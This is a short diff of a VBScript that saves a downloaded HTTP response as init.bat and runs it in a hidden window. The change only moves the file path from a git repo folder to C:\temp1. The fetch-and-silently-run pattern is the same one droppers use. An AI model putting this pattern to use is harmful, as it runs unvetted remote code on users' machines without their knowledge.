@@ -7,8 +7,8 @@ with bStrm
     .type = 1 '//binary
     .open
     .write xHttp.responseBody
-    .savetofile "C:\git\repo\init.bat", 2 '//overwrite
+    .savetofile "C:\temp1\init.bat", 2 '//overwrite
 end with
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run chr(34) & "C:\git\repo\init.bat" & Chr(34), 0
+WshShell.Run chr(34) & "C:\temp1\init.bat" & Chr(34), 0
 Set WshShell = Nothing
